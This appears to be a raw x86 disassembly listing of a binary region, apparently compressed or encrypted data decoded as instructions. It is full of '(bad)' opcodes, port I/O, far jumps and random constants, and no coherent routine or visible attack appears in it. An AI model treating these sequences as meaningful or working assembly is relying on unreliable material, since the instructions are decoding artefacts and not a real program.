  42beaa:	and    BYTE PTR ds:0xc0854d3e,0xa4
  42beb1:	stos   BYTE PTR es:[edi],al
  42beb2:	and    dh,dh
  42beb4:	sar    BYTE PTR [edx],0xf9
  42beb7:	jecxz  0x42be97
  42beb9:	enter  0x1f40,0xfb
  42bebd:	and    dh,BYTE PTR [edx]
  42bebf:	out    dx,eax
  42bec0:	xchg   ebp,eax
  42bec1:	or     BYTE PTR [eax],al
	...
  42bf33:	add    cl,bh
  42bf35:	enter  0xdc7a,0x7b
  42bf39:	(bad)  
  42bf3a:	(bad)  
  42bf3b:	in     eax,dx
  42bf3c:	out    dx,al
  42bf3d:	mov    ah,0x3
  42bf3f:	dec    ecx
  42bf40:	xchg   edi,eax
  42bf41:	mul    DWORD PTR [ebx]
  42bf43:	arpl   ax,si
  42bf45:	rol    DWORD PTR [ecx],1
  42bf47:	add    dh,dh
  42bf49:	add    BYTE PTR [eax],al
  42bf4b:	add    BYTE PTR [edx],dh
  42bf4d:	dec    edx
  42bf4e:	sub    al,0x3c
  42bf50:	pop    ss
  42bf51:	xchg   ebp,eax
  42bf52:	out    0x4f,al
  42bf54:	ror    BYTE PTR [ebp-0x13],0x51
  42bf58:	adc    BYTE PTR [edi+0x24692812],ah
  42bf5e:	dec    eax
  42bf5f:	jg     0x42bf2d
  42bf61:	cdq    
  42bf62:	and    al,0x68
  42bf64:	(bad)  
  42bf65:	push   0x73
  42bf67:	lahf   
  42bf68:	lock stos DWORD PTR es:[edi],eax
  42bf6a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42bf6b:	adc    edx,DWORD PTR [edx+0x36]
  42bf6e:	mov    dh,0x99
  42bf70:	dec    edi
  42bf71:	mov    edx,0xb80b67f0
  42bf76:	cmp    DWORD PTR [ebx+0xf],ebx
  42bf79:	call   DWORD PTR [esp+edi*4]
  42bf7c:	mov    ds:0xe6c15177,al
  42bf81:	jg     0x42bff2
  42bf83:	cmp    ecx,eax
  42bf85:	fidivr WORD PTR [eax-0x56774670]
  42bf8b:	retf   0x72d6
  42bf8e:	push   ss
  42bf8f:	jp     0x42bff4
  42bf91:	push   0x5b6e7377
  42bf96:	test   BYTE PTR [edx+0x4f],ah
  42bf99:	and    eax,0x48aa1d49
  42bf9e:	mov    ebx,0xf49916c1
  42bfa3:	sbb    eax,0x47cccce8
  42bfa8:	ja     0x42bf37
  42bfaa:	ds cli 
  42bfac:	aas    
  42bfad:	mov    gs,WORD PTR [ebx+0x73]
  42bfb0:	(bad)
  42bfb3:	push   edx
  42bfb4:	jle    0x42bfd5
  42bfb6:	gs and esp,ebp
  42bfb9:	push   edx
  42bfba:	xor    al,0x28
  42bfbc:	inc    ebx
  42bfbd:	push   edx
  42bfbe:	scas   eax,DWORD PTR es:[edi]
  42bfbf:	inc    esp
  42bfc0:	lds    ebp,FWORD PTR [edi+0x3be22cc]
  42bfc6:	test   eax,0xdb021f75
  42bfcb:	shl    DWORD PTR [ecx-0x3ff92a2e],0x81
  42bfd2:	sbb    bh,dl
  42bfd4:	mov    eax,0x2c5fbc22
  42bfd9:	push   0xe48be641
  42bfde:	inc    ebp
  42bfdf:	cmp    al,0x20
  42bfe1:	call   0xd543:0xb55fd0d
  42bfe8:	adc    BYTE PTR [edi-0x33148e0a],dl
  42bfee:	sub    BYTE PTR [edi+eax*4+0x1a2c0f71],dh
  42bff5:	in     eax,dx
  42bff6:	ror    BYTE PTR [ecx-0x71bea05f],cl
  42bffc:	cmp    eax,0xefdee5f3
  42c001:	bound  ecx,QWORD PTR [ebp+ebp*4+0x6895e609]
  42c008:	xor    al,bh
  42c00a:	mov    ah,0x89
  42c00c:	lods   eax,DWORD PTR ds:[esi]
  42c00d:	xor    dl,bh
  42c00f:	mov    cl,0xf8
  42c011:	xchg   esp,eax
  42c012:	add    BYTE PTR [edx-0x2a],0x15
  42c016:	push   ebx
  42c017:	je     0x42bf99
  42c019:	cmp    BYTE PTR [ecx-0x4b],bh
  42c01c:	push   ss
  42c01d:	inc    esp
  42c01e:	mov    ah,0x76
  42c020:	and    DWORD PTR [eax],esp
  42c022:	in     al,dx
  42c023:	xchg   DWORD PTR [eax],ebx
  42c025:	in     al,dx
  42c026:	test   eax,0xe8345986
  42c02b:	mov    edx,0x443cc6e9
  42c030:	dec    ebx
  42c031:	push   ebx
  42c032:	pop    edi
  42c033:	popa   
  42c034:	push   cs
  42c035:	das    
  42c036:	and    dl,bh
  42c038:	leave  
  42c039:	(bad)  
  42c03a:	mov    dl,0x7f
  42c03c:	jmp    0xb3705d28
  42c041:	and    eax,0x0
	...
  42c0b2:	add    BYTE PTR [eax],al
  42c0b4:	jne    0x42c0db
  42c0b6:	imul   ebx,DWORD PTR [edi-0x51]
  42c0ba:	cmc    
  42c0bb:	(bad)  
  42c0bc:	call   0x82942915
  42c0c1:	or     al,0x32
  42c0c3:	test   esi,esp
  42c0c5:	rol    BYTE PTR [ecx],cl
  42c0c7:	add    dh,dh
  42c0c9:	add    BYTE PTR [eax],al
  42c0cb:	add    BYTE PTR [edi+ebx*8-0x214c219f],dh
  42c0d2:	jmp    0x42c114
  42c0d4:	repz and DWORD PTR [ebp-0x76a72c36],eax
  42c0db:	jmp    0x42c0a5
  42c0dd:	repz retf 0x5f1a
  42c0e1:	sub    edi,DWORD PTR [eax+0x1c]
  42c0e4:	not    bh
  42c0e6:	pop    ebx
  42c0e7:	loopne 0x42c15e
  42c0e9:	add    BYTE PTR [esp+ecx*2+0x63],dl
  42c0ed:	xchg   esi,eax
  42c0ee:	pop    esi
  42c0ef:	jnp    0x42c151
  42c0f1:	adc    DWORD PTR [esi+0x1d924bc4],edx
  42c0f7:	in     eax,dx
  42c0f8:	pushf  
  42c0f9:	mov    edi,ecx
  42c0fb:	retf   
  42c0fc:	push   es
  42c0fd:	jmp    0x42c173
  42c0ff:	or     cl,cl
  42c101:	jmp    0xd18d:0xcf2a195e
  42c108:	inc    ebp
  42c109:	fdivr  st(3),st
  42c10b:	test   BYTE PTR [eax-0x6],cl
  42c10e:	jo     0x42c0b8
  42c110:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42c111:	daa    
  42c112:	in     al,0x7
  42c114:	ins    BYTE PTR es:[edi],dx
  42c115:	sbb    al,0x2a
  42c117:	xor    ah,BYTE PTR [esi]
  42c119:	(bad)  [edi]
  42c11b:	outs   dx,BYTE PTR ds:[esi]
  42c11c:	and    dh,BYTE PTR [edx+ecx*8]
  42c11f:	sub    eax,ecx
  42c121:	test   ebp,esi
  42c123:	cdq    
  42c124:	add    BYTE PTR [eax],ch
  42c126:	inc    ecx
  42c127:	fiadd  WORD PTR [edx-0x11]
  42c12a:	xor    DWORD PTR [bx+si],ebx
  42c12d:	sub    DWORD PTR [ebx-0x170552fd],esp
  42c133:	popa   
  42c134:	and    eax,0x496f62a2
  42c139:	add    BYTE PTR [esi-0x29],ch
  42c13c:	and    dl,cl
  42c13e:	or     DWORD PTR [esi],esp
  42c140:	(bad)  
  42c141:	pop    ds
  42c142:	clc    
  42c143:	add    eax,0x312b757f
  42c148:	inc    ebx
  42c149:	sub    BYTE PTR [edx+0x5e],dh
  42c14c:	pushf  
  42c14d:	in     eax,0x92
  42c14f:	cmp    BYTE PTR [ecx+0x4c],cl
  42c152:	jns    0x42c0fc
  42c154:	(bad)  
  42c155:	mov    bl,0xad
  42c157:	mov    eax,ds:0x7e76005d
  42c15c:	aas    
  42c15d:	fmul   st(1),st
  42c15f:	mov    al,0xd6
  42c161:	pop    es
  42c162:	in     eax,dx
  42c163:	int3   
  42c164:	bound  ebp,QWORD PTR [esi+0x544b0c3c]
  42c16a:	jmp    0x94ab:0xeb95d577
  42c171:	push   esp
  42c172:	mov    bh,0x23
  42c174:	sbb    BYTE PTR [ecx],dl
  42c176:	jl     0x42c193
  42c178:	call   0xcada2894
  42c17d:	stc    
  42c17e:	xchg   edi,eax
  42c17f:	jl     0x42c1a9
  42c181:	add    esp,esp
  42c183:	das    
  42c184:	dec    edi
  42c185:	std    
  42c186:	xor    al,0xc8
  42c188:	push   esp
  42c189:	repnz mov gs,ebx
  42c18c:	xor    al,0x47
  42c18e:	or     ebx,DWORD PTR [ecx+0x3bcc9830]
  42c194:	aad    0xe5
  42c196:	je     0x42c1ba
  42c198:	cmp    DWORD PTR [edi+eiz*4+0x1775cb21],esp
  42c19f:	mov    ebp,0xb156f3f6
  42c1a4:	aas    
  42c1a5:	out    dx,eax
  42c1a6:	icebp  
  42c1a7:	jl     0x42c19d
  42c1a9:	mov    ebx,0x6550fbdd
  42c1ae:	pop    ebp
  42c1af:	jg     0x42c157
  42c1b1:	aas    
  42c1b2:	dec    esp
  42c1b3:	adc    eax,0xca7e3b60
  42c1b8:	call   DWORD PTR [eax+0x4e062127]
  42c1be:	retf   0xbd0e
  42c1c1:	add    BYTE PTR [eax],0x0
	...
  42c234:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42c235:	mov    ds,WORD PTR [ecx-0x28844a0]
  42c23b:	iret   
  42c23c:	xchg   esp,eax
  42c23d:	xor    edx,DWORD PTR [ecx+ebp*1-0x2f]
  42c241:	imul   ebx,edi,0x1d3dc3e
  42c247:	add    dh,dh
  42c249:	add    BYTE PTR [eax],al
  42c24b:	add    BYTE PTR [ebx-0x3a3bd3c0],bl
  42c251:	arpl   WORD PTR [ecx+0x1d],bp
  42c254:	xchg   esp,eax
  42c255:	stos   BYTE PTR es:[edi],al
  42c256:	push   esp
  42c257:	pop    eax
  42c258:	inc    esp
  42c259:	sub    esp,DWORD PTR [ebp-0x78]
  42c25c:	cmp    bh,BYTE PTR ds:[eax]
  42c25f:	and    ebx,edi
  42c261:	mov    edx,0xe69ff35f
  42c266:	fs sub ah,dh
  42c269:	cmovnp edi,DWORD PTR [esi+0x9dbeeb1]
  42c270:	nop
  42c271:	loopne 0x42c231
  42c273:	cmp    BYTE PTR [eax],0x22
  42c276:	push   ss
  42c277:	data16 mov bl,0xfe
  42c27a:	shl    ah,1
  42c27c:	jle    0x42c2ec
  42c27e:	pop    esi
  42c27f:	mov    al,ds:0xc6311d2a
  42c284:	mov    ebp,0xfddf16e8
  42c289:	xchg   ecx,eax
  42c28a:	retf   
  42c28b:	mov    eax,0xdcd8b80e
  42c290:	add    eax,0xe2c3721b
  42c295:	sbb    DWORD PTR [ecx-0x1f99641b],ebx
  42c29b:	mov    dh,0x2e
  42c29d:	scas   eax,DWORD PTR es:[edi]
  42c29e:	mov    dh,0x17
  42c2a0:	and    eax,0x4cb019a0
  42c2a5:	add    BYTE PTR [ecx-0x5bde274b],bh
  42c2ab:	test   edi,eax
  42c2ad:	sbb    esp,DWORD PTR [edx-0x35a24988]
  42c2b3:	gs push ebp
  42c2b5:	stos   WORD PTR es:[edi],ax
  42c2b7:	mov    WORD PTR [esi+eax*2],?
  42c2ba:	das    
  42c2bb:	call   0x2260f81c
  42c2c0:	inc    esi
  42c2c1:	mov    ecx,0x7ad8fd83
  42c2c6:	sbb    al,0x5d
  42c2c8:	fldl2e 
  42c2ca:	jle    0x42c2fc
  42c2cc:	sub    al,0x97
  42c2ce:	fnclex 
  42c2d0:	mov    ah,0xe6
  42c2d2:	out    dx,al
  42c2d3:	dec    esp
  42c2d4:	lea    eax,[ecx+0x3c]
  42c2d7:	outs   dx,DWORD PTR ds:[esi]
  42c2d8:	pop    ebp
  42c2d9:	or     al,0xd1
  42c2db:	out    0x95,eax
  42c2dd:	imul   edi,DWORD PTR [eax],0xdd15ad19
  42c2e3:	mov    ebx,DWORD PTR [ecx]
  42c2e5:	int    0x21
  42c2e7:	jmp    0x42c281
  42c2e9:	push   esi
  42c2ea:	ficomp DWORD PTR [edx]
  42c2ec:	sbb    eax,0xa78b4c29
  42c2f1:	jle    0x42c308
  42c2f3:	retf   
  42c2f4:	stos   BYTE PTR es:[edi],al
  42c2f5:	pop    eax
  42c2f6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42c2f7:	jnp    0x42c305
  42c2f9:	shl    BYTE PTR [esi-0x2c],0xab
  42c2fd:	jmp    0x106e20a6
  42c302:	mov    eax,esp
  42c304:	dec    esi
  42c305:	ins    BYTE PTR es:[edi],dx
  42c306:	and    dh,BYTE PTR [esi+ebp*1-0x32555738]
  42c30d:	inc    ebp
  42c30e:	pop    ds
  42c30f:	xchg   ebp,eax
  42c310:	mov    bl,0xb3
  42c312:	outs   dx,DWORD PTR ds:[esi]
  42c313:	outs   dx,BYTE PTR ds:[esi]
  42c314:	cld    
  42c315:	mov    ch,ah
  42c317:	inc    ecx
  42c318:	sar    BYTE PTR es:[edi+0x7a2b730b],cl
  42c31f:	sbb    DWORD PTR [esi+0x63a82a28],ecx
  42c325:	cmp    dh,bl
  42c327:	mov    cl,BYTE PTR [ebx]
  42c329:	push   ebx
  42c32a:	outs   dx,BYTE PTR ds:[esi]
  42c32b:	push   0x80bcbe56
  42c330:	adc    bh,BYTE PTR [edx]
  42c332:	div    DWORD PTR [edx]
  42c334:	ja     0x42c2fe
  42c336:	push   eax
  42c337:	scas   eax,DWORD PTR es:[edi]
  42c338:	add    BYTE PTR [edi],bh
  42c33a:	dec    ebx
  42c33b:	sub    eax,0x80c927bd
  42c340:	push   0xa
	...
  42c3b2:	add    BYTE PTR [eax],al
  42c3b4:	mov    al,BYTE PTR [ebp+0x20]
  42c3b7:	out    dx,al
  42c3b8:	out    dx,eax
  42c3b9:	out    dx,eax
  42c3ba:	into   
  42c3bb:	gs aam 0xa
  42c3be:	fst    DWORD PTR [ecx-0x30]
  42c3c1:	push   cs
  42c3c2:	std    
  42c3c3:	fcmovbe st,st(2)
  42c3c5:	aam    0x1
  42c3c7:	add    dh,dh
  42c3c9:	add    BYTE PTR [eax],al
  42c3cb:	add    BYTE PTR [esi+0x1a0fdf2b],bh
  42c3d1:	fdiv   st(7),st
  42c3d3:	jns    0x42c44d
  42c3d5:	inc    edi
  42c3d6:	pushf  
  42c3d7:	fbld   TBYTE PTR cs:[ebx]
  42c3da:	sbb    ecx,DWORD PTR [esi]
  42c3dc:	xchg   BYTE PTR [ecx],ch
  42c3de:	add    BYTE PTR [ebx],ch
  42c3e0:	xchg   BYTE PTR [edx+ebp*2-0x20cf20d5],ch
  42c3e7:	mov    edx,0x6cc10211
  42c3ec:	pop    ebx
  42c3ed:	test   DWORD PTR [edi-0x38],esp
  42c3f0:	xor    edx,DWORD PTR [edx+0x1ff4d425]
  42c3f6:	xor    DWORD PTR [ecx-0x75],0xfffffff8
  42c3fa:	sbb    DWORD PTR [esp+edi*4+0x52d59a07],0xdf3277ef
  42c405:	cmps   DWORD PTR cs:[esi],DWORD PTR es:[edi]
  42c407:	jbe    0x42c448
  42c409:	inc    eax
  42c40a:	cwde   
  42c40b:	sahf   
  42c40c:	dec    ebp
  42c40d:	pop    ebx
  42c40e:	adc    DWORD PTR [edi-0x701e3514],eax
  42c414:	fstp   QWORD PTR [esi-0x7a212fe9]
  42c41a:	scas   al,BYTE PTR es:[edi]
  42c41b:	sub    ebx,DWORD PTR ds:0x7e8cc7c3
  42c421:	cmp    ah,BYTE PTR cs:[ebp+0x41cd779a]
  42c428:	and    BYTE PTR [edi+esi*2+0x9],cl
  42c42c:	and    edi,DWORD PTR [esi+eax*8-0x5a]
  42c430:	mov    ds:0x724d85a3,al
  42c435:	js     0x42c46d
  42c437:	std    
  42c438:	ja     0x42c45d
  42c43a:	repnz aad 0xf9
  42c43d:	push   edi
  42c43e:	jp     0x42c48e
  42c440:	cld    
  42c441:	imul   eax,DWORD PTR [eax],0xec782a3a
  42c447:	jmp    0xf1e771c0
  42c44c:	pop    es
  42c44d:	ins    BYTE PTR es:[edi],dx
  42c44e:	and    BYTE PTR [edx],bl
  42c450:	pop    edx
  42c451:	scas   al,BYTE PTR es:[edi]
  42c452:	jne    0x42c413
  42c454:	test   eax,0x56aee42e
  42c459:	jmp    0x42c403
  42c45b:	xor    DWORD PTR [ebx],edx
  42c45d:	xchg   BYTE PTR [eax],bh
  42c45f:	jnp    0x42c41b
  42c461:	ins    DWORD PTR es:[di],dx
  42c463:	aas    
  42c464:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42c465:	ds mov cl,0xed
  42c468:	adc    BYTE PTR [edx-0x2d],bl
  42c46b:	and    DWORD PTR [ebp+0x12],ebx
  42c46e:	xchg   esp,eax
  42c46f:	fsubr  DWORD PTR [ebx+0x28]
  42c472:	or     ebx,edx
  42c474:	jmp    0xb40d:0xd7a3b98e
  42c47b:	xor    ebp,DWORD PTR [eax]
  42c47d:	js     0x42c4f8
  42c47f:	jl     0x42c4f2
  42c481:	mov    eax,esi
  42c483:	cmp    BYTE PTR [eax+0x7e],cl
  42c486:	dec    esi
  42c487:	test   al,0x44
  42c489:	fsub   QWORD PTR [eax+0x70]
  42c48c:	jns    0x42c496
  42c48e:	arpl   WORD PTR [ebp-0x7950e609],si
  42c494:	mov    al,ds:0x887e5311
  42c499:	push   ebx
  42c49a:	push   ebx
  42c49b:	inc    edx
  42c49c:	push   ds
  42c49d:	lds    edi,FWORD PTR [ebx+0x18]
  42c4a0:	and    DWORD PTR [edi+0xb],0xf25183aa
  42c4a7:	mov    dl,0xe8
  42c4a9:	mov    ebp,0x2702d1c9
  42c4ae:	(bad)  
  42c4af:	fild   WORD PTR [eax+0x29]
  42c4b2:	stos   BYTE PTR es:[edi],al
  42c4b3:	xchg   esp,eax
  42c4b4:	enter  0xe6c5,0x5c
  42c4b8:	sub    edx,eax
  42c4ba:	adc    ebx,eax
  42c4bc:	aaa    
  42c4bd:	jnp    0x42c52b
  42c4bf:	or     ch,ah
  42c4c1:	xchg   edx,eax
	...
  42c532:	add    BYTE PTR [eax],al
  42c534:	loopne 0x42c4ca
  42c536:	and    bh,cl
  42c538:	je     0x42c539
  42c53a:	out    dx,eax
  42c53b:	mov    edi,0x9a7cd6c5
  42c540:	sub    al,0xb4
  42c542:	adc    DWORD PTR [ebp-0x38],edi
  42c545:	aad    0x1
  42c547:	add    dh,dh
  42c549:	add    BYTE PTR [eax],al
  42c54b:	add    BYTE PTR [edx],dl
  42c54d:	stc    
  42c54e:	or     bh,BYTE PTR [ebp+0x7499c2ad]
  42c554:	call   0x55a66aa7
  42c559:	out    dx,eax
  42c55a:	lds    eax,FWORD PTR gs:[edi-0x46]
  42c55e:	or     al,BYTE PTR ds:0x301ed207
  42c564:	add    al,0x47
  42c566:	xchg   ebp,eax
  42c567:	xor    ebp,DWORD PTR [esi-0x5084d0be]
  42c56d:	and    bh,BYTE PTR [edx-0x4c058bde]
  42c573:	mov    WORD PTR [ebx-0x2e],fs
  42c576:	dec    esi
  42c577:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42c578:	jecxz  0x42c524
  42c57a:	dec    ecx
  42c57b:	cwde   
  42c57c:	stos   BYTE PTR es:[edi],al
  42c57d:	or     DWORD PTR [eax-0x726bd779],ebx
  42c583:	sbb    al,0xfe
  42c585:	cmp    eax,0x1c8fab47
  42c58a:	add    eax,0x6fbe8539
  42c58f:	icebp  
  42c590:	ror    BYTE PTR [edi+0x76],0x8
  42c594:	xor    al,0x79
  42c596:	popf   
  42c597:	xlat   BYTE PTR ds:[ebx]
  42c598:	hlt    
  42c599:	adc    eax,0xc67f6aec
  42c59e:	adc    DWORD PTR [esp+esi*4+0x546cb062],0x8
  42c5a6:	repz jge 0x42c5bf
  42c5a9:	jmp    0x42a80629
  42c5ae:	cmp    DWORD PTR [esi+0x118b4473],esi
  42c5b4:	js     0x42c53b
  42c5b6:	and    al,0x47
  42c5b8:	add    al,0x19
  42c5ba:	cmp    eax,0xcbb75826
  42c5bf:	daa    
  42c5c0:	mov    bl,0xc8
  42c5c2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42c5c3:	xor    eax,esi
  42c5c5:	lahf   
  42c5c6:	icebp  
  42c5c7:	sbb    bh,al
  42c5c9:	paddd  mm6,QWORD PTR [edx-0x36]
  42c5cd:	or     edi,DWORD PTR [edi]
  42c5cf:	or     dh,BYTE PTR [ebx+0xfc16731]
  42c5d5:	int3   
  42c5d6:	mov    edx,0x41215f8
  42c5db:	pushf  
  42c5dc:	push   ds
  42c5dd:	rol    BYTE PTR [edx-0x1b],0x2a
  42c5e1:	dec    edi
  42c5e2:	jl     0x42c620
  42c5e4:	mov    ebp,0xb1957409
  42c5e9:	faddp  st(0),st
  42c5eb:	and    DWORD PTR [edi],esp
  42c5ed:	push   ss
  42c5ee:	fcomp  DWORD PTR [eax+eax*8]
  42c5f1:	mov    al,BYTE PTR [ecx-0x10a9cca8]
  42c5f7:	add    al,0x7f
  42c5f9:	hlt    
  42c5fa:	in     al,dx
  42c5fb:	xchg   BYTE PTR [ebx+0x19],al
  42c5fe:	ror    DWORD PTR [eax+0x7],0x53
  42c602:	dec    edx
  42c603:	mov    WORD PTR [edx],es
  42c605:	add    DWORD PTR [ebx-0x1a],ebp
  42c608:	cmp    DWORD PTR [ecx+0x20],ebx
  42c60b:	(bad)  [ebx]
  42c60d:	mov    esi,DWORD PTR [ecx]
  42c60f:	cwde   
  42c610:	fild   WORD PTR [ebp-0x7e46e168]
  42c616:	icebp  
  42c617:	push   eax
  42c618:	js     0x42c64b
  42c61a:	shl    BYTE PTR [eax+edx*8],1
  42c61d:	cmp    DWORD PTR ds:0x908dfc02,edx
  42c623:	in     al,0x8b
  42c625:	daa    
  42c626:	je     0x42c663
  42c628:	and    ebp,DWORD PTR [ebp+ebx*1-0x6e]
  42c62c:	jmp    0xc36a:0x17ae25af
  42c633:	push   ebp
  42c634:	rcr    DWORD PTR [esp+ecx*1],1
  42c637:	sbb    cl,BYTE PTR [esi]
  42c639:	dec    ebp
  42c63a:	mov    al,0xc2
  42c63c:	mov    dh,0xd7
  42c63e:	and    eax,0xb39ee4
	...
  42c6b3:	add    BYTE PTR [esi+0x42],cl
  42c6b6:	dec    ecx
  42c6b7:	daa    
  42c6b8:	dec    ebp
  42c6b9:	das    
  42c6ba:	outs   dx,BYTE PTR ds:[esi]
  42c6bb:	imul   ebp,esi,0x7b
  42c6be:	enter  0x1bbe,0xe3
  42c6c2:	fcmovnbe st,st(4)
  42c6c4:	mov    esi,0xf60001d6
  42c6c9:	add    BYTE PTR [eax],al
  42c6cb:	add    BYTE PTR [ebp+0x18],al
  42c6ce:	fs popf 
  42c6d0:	ss in  al,dx
  42c6d2:	(bad)
  42c6d5:	call   0x8a81:0x1db5452c
  42c6dc:	call   0xa529:0x1d177611
  42c6e3:	cmc    
  42c6e4:	jno    0x42c682
  42c6e6:	sar    ebp,1
  42c6e8:	sbb    dh,al
  42c6ea:	jb     0x42c6a9
  42c6ec:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42c6ed:	inc    ecx
  42c6ee:	pop    ebx
  42c6ef:	rcr    DWORD PTR [eax],0x88
  42c6f2:	je     0x42c73d
  42c6f4:	pop    eax
  42c6f5:	dec    esp
  42c6f6:	adc    dh,al
  42c6f8:	mov    edi,0x4c385072
  42c6fd:	jle    0x42c728
  42c6ff:	int    0xa2
  42c701:	scas   eax,DWORD PTR es:[edi]
  42c702:	es xchg esi,eax
  42c704:	add    al,0xd1
  42c706:	mov    DWORD PTR cs:[ebp+eax*8+0x2a2199fe],ebx
  42c70e:	retf   
  42c70f:	out    0x7d,eax
  42c711:	push   edi
  42c712:	xchg   esi,eax
  42c713:	daa    
  42c714:	outs   dx,DWORD PTR ds:[esi]
  42c715:	mov    bl,0xbc
  42c717:	add    bh,BYTE PTR [esi+0x36]
  42c71a:	mov    eax,0xce11bdf0
  42c71f:	adc    edi,DWORD PTR [edx-0x14340580]
  42c725:	clc    
  42c726:	jbe    0x42c6e0
  42c728:	pop    esi
  42c729:	dec    esi
  42c72a:	mov    eax,0x97c30987
  42c72f:	mov    ds:0xb9f0136b,al
  42c734:	mov    ecx,0x19bd839d
  42c739:	arpl   WORD PTR [esi-0x63],di
  42c73c:	outs   dx,DWORD PTR ds:[esi]
  42c73d:	cs push cs
  42c73f:	jecxz  0x42c778
  42c741:	jnp    0x42c6eb
  42c743:	sbb    al,0x97
  42c745:	js     0x42c784
  42c747:	int3   
  42c748:	jg     0x42c71b
  42c74a:	pop    ss
  42c74b:	out    dx,al
  42c74c:	sti    
  42c74d:	int3   
  42c74e:	cmp    esp,DWORD PTR [ebp+0x6]
  42c751:	daa    
  42c752:	mov    esi,0x749bd8c0
  42c757:	add    esp,DWORD PTR [ebp+eiz*8-0x29]
  42c75b:	xchg   BYTE PTR [ebp+0x41],ah
  42c75e:	or     dh,BYTE PTR [ecx-0x76]
  42c761:	(bad)  
  42c762:	dec    ebp
  42c763:	aad    0xa4
  42c765:	lods   al,BYTE PTR ds:[esi]
  42c766:	jmp    0x607d0ce1
  42c76b:	stc    
  42c76c:	adc    cl,BYTE PTR [ecx+0x794258b6]
  42c772:	pop    edi
  42c773:	pop    edx
  42c774:	and    DWORD PTR [edi-0x53],esi
  42c777:	adc    ah,BYTE PTR [esi-0x4e1d42ef]
  42c77d:	aad    0xaa
  42c77f:	jo     0x42c7eb
  42c781:	add    eax,0x2be92539
  42c786:	add    eax,0x3f54ba4b
  42c78b:	stc    
  42c78c:	mov    ebp,DWORD PTR [ebp-0x78]
  42c78f:	hlt    
  42c790:	or     esp,DWORD PTR [esi]
  42c792:	mov    ecx,DWORD PTR [eax+0x6f]
  42c795:	scas   eax,DWORD PTR es:[edi]
  42c796:	cmp    al,cl
  42c798:	dec    ebx
  42c799:	js     0x89e091fc
  42c79f:	xchg   ecx,eax
  42c7a0:	mov    ch,0x14
  42c7a2:	out    dx,eax
  42c7a3:	aam    0x26
  42c7a5:	imul   ecx,ebx,0xffffffc4
  42c7a8:	test   BYTE PTR [ebx+0x7a],dl
  42c7ab:	mov    ebp,0x56e17c6
  42c7b0:	retf   0x2a3c
  42c7b3:	cli    
  42c7b4:	imul   eax,DWORD PTR [eax-0x7199e6d6],0x7a
  42c7bb:	sar    BYTE PTR [edx-0x38fa1dfb],0x82
	...
  42c832:	add    BYTE PTR [eax],al
  42c834:	call   0x2a86d6
  42c839:	out    0xf9,eax
  42c83b:	lahf   
  42c83c:	or     ch,bh
  42c83e:	fdiv   DWORD PTR ds:0xc17a2873
  42c844:	mov    ah,0xd7
  42c846:	add    DWORD PTR [eax],eax
  42c848:	test   BYTE PTR [eax],0x0
  42c84b:	add    dh,dh
  42c84d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42c84e:	inc    edi
  42c84f:	enter  0x510b,0x4e
  42c853:	inc    edx
  42c854:	jne    0x42c89f
  42c856:	adc    ah,BYTE PTR fs:[eax-0x39]
  42c85a:	das    
  42c85b:	jnp    0x42c887
  42c85d:	add    eax,0xa0766754
  42c862:	sbb    DWORD PTR [esi-0x28],esi
  42c865:	ds cld 
  42c867:	or     cl,BYTE PTR [edx+0x4c]
  42c86a:	out    dx,al
  42c86b:	retf   
  42c86c:	inc    ebx
  42c86d:	iret   
  42c86e:	mov    eax,ds:0x48a4586c
  42c873:	fcom   DWORD PTR [eax-0x42]
  42c876:	ss push eax
  42c878:	out    dx,eax
  42c879:	(bad)  
  42c87a:	shr    BYTE PTR [esi],0x68
  42c87d:	out    dx,eax
  42c87e:	mov    DWORD PTR [edi+ebx*2+0x69],edx
  42c882:	cwde   
  42c883:	adc    bl,ch
  42c885:	mov    WORD PTR [eax+0x23],cs
  42c888:	pusha  
  42c889:	in     al,dx
  42c88a:	cmp    eax,0x7e63b7f7
  42c88f:	add    DWORD PTR ss:[edx],edi
  42c892:	ins    BYTE PTR es:[edi],dx
  42c893:	jnp    0x42c81b
  42c895:	dec    edx
  42c896:	mov    ?,ebx
  42c898:	ins    DWORD PTR es:[edi],dx
  42c899:	mov    ds:0x71d9a284,al
  42c89e:	jecxz  0x42c90b
  42c8a0:	inc    ecx
  42c8a1:	(bad)  
  42c8a2:	pusha  
  42c8a3:	cmp    dh,BYTE PTR fs:[edx-0x75654eb3]
  42c8aa:	cmp    DWORD PTR [edx],ebp
  42c8ac:	cmp    dh,BYTE PTR [edx-0x219ca3c4]
  42c8b2:	pop    ss
  42c8b3:	xchg   BYTE PTR [ecx+0x120bb47f],cl
  42c8b9:	xchg   edx,eax
  42c8ba:	jle    0x42c8cd
  42c8bc:	js     0x42c894
  42c8be:	cmp    ebx,eax
  42c8c0:	xchg   ebp,eax
  42c8c1:	inc    eax
  42c8c2:	xor    DWORD PTR [ecx+0x22d824f9],eax
  42c8c8:	sar    DWORD PTR ds:0xc9d5281,cl
  42c8ce:	fst    st(1)
  42c8d0:	nop
  42c8d1:	push   esi
  42c8d2:	mov    ecx,0x2a5cba46
  42c8d7:	dec    esi
  42c8d8:	dec    ebp
  42c8d9:	dec    ebx
  42c8da:	add    esi,ebx
  42c8dc:	mov    eax,0xda894400
  42c8e1:	push   esp
  42c8e2:	out    0x9a,al
  42c8e4:	push   ss
  42c8e5:	dec    edx
  42c8e6:	cmp    al,0x8c
  42c8e8:	in     eax,dx
  42c8e9:	retf   
  42c8ea:	(bad)  
  42c8eb:	fcomip st,st(3)
  42c8ed:	jecxz  0x42c904
  42c8ef:	fwait
  42c8f0:	dec    ebx
  42c8f1:	test   BYTE PTR [edx-0x2ce26855],dl
  42c8f7:	sbb    BYTE PTR [esi-0x47],dh
  42c8fa:	sti    
  42c8fb:	push   esi
  42c8fc:	xor    bh,BYTE PTR [eax]
  42c8fe:	sub    al,0xf6
  42c900:	enter  0xb924,0x3c
  42c904:	fcmovne st,st(1)
  42c906:	ins    BYTE PTR es:[edi],dx
  42c907:	add    BYTE PTR [esi],ch
  42c909:	jmp    0x42c8d3
  42c90b:	xor    eax,0x912fa2c1
  42c910:	fisttp DWORD PTR [eax+0x27]
